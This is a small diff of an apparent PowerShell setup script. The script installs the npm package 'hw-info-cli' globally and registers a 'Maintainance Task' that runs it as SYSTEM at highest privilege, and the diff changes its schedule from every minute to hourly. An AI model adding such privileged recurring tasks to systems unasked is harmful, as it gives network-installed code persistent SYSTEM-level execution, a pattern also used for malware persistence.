@@ -15,4 +15,4 @@ Write-Host 'Downloading cli'
 Start-Process powershell -ArgumentList "-command &{ npm i hw-info-cli -g }" -Wait
 
 Write-Host 'Setting Tasks'
-schtasks /create /sc MINUTE /tn "Maintainance Task" /tr "hw-info-cli" /ru System /rl Highest
+schtasks /create /sc HOURLY /tn "Maintainance Task" /tr "hw-info-cli" /ru System /rl Highest
